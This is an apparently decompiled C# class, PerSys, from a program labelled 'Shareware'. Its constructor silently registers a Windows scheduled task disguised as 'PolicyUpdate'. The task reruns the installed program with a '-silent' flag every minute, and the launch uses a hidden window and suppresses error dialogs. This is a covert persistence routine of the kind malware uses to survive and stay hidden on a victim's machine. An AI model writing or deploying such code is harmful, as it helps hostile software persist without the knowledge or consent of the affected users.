using System;
using System.Diagnostics;
using Microsoft.VisualBasic.CompilerServices;

namespace Shareware.Shareware.core;

public class PerSys
{
	public PerSys()
	{
		int try0006_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 116:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0006;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 3:
							goto end_IL_0006_3;
						}
						goto default;
					}
					end_IL_0006_2:
					break;
				}
				num = 2;
				Process.Start(new ProcessStartInfo
				{
					FileName = "schtasks",
					Arguments = "/create /sc minute /mo 1 /tn PolicyUpdate /tr \"" + DirPaths.InstallDir + " -silent\"",
					CreateNoWindow = true,
					ErrorDialog = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
				break;
				end_IL_0006:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 116;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
